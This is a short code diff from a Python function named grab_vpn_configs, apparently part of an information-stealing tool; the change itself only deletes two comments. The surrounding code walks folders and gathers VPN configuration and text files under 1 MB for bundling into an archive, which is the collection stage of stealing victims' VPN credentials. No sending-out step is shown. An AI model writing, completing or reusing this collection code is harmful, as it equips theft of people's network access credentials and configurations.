@@ -25,11 +25,10 @@ def grab_vpn_configs():
                     if any(ext in file.lower() for ext in ['.ovpn', '.conf', '.json', '.txt', '.xml']):
                         file_path = os.path.join(root, file)
                         try:
-                            if os.path.getsize(file_path) < 1 * 1024 * 1024: # 1MB limit
+                            if os.path.getsize(file_path) < 1 * 1024 * 1024:
                                 arcname = os.path.join(name, os.path.relpath(file_path, path))
                                 vpn_files.append((arcname, file_path))
                         except: pass
-                # Depth limit
                 if root.count(os.sep) - path.count(os.sep) > 2:
                     break
                     
